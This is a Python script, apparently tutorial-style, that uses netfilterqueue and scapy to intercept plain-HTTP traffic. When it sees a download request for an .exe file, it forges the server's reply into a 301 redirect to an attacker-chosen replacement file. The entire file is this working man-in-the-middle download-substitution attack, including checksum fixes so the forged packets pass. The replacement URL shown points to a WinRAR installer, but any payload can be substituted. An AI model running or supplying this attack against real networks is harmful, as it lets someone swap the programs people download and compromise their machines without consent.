import netfilterqueue
import scapy.all as scapy

REPLACEMENT_FILE = "https://www.rarlab.com/rar/winrar-x64-624.exe" 
ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load.decode(errors="ignore"):
                print("[+] .exe Download Request Detected")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing File...")
                
                redirect_load = "HTTP/1.1 301 Moved Permanently\r\nLocation: " + REPLACEMENT_FILE + "\r\n\r\n"
                scapy_packet[scapy.Raw].load = redirect_load
                
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                packet.set_payload(bytes(scapy_packet))

    packet.accept()

print("[*] File Interceptor is running (Queue 0)...")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
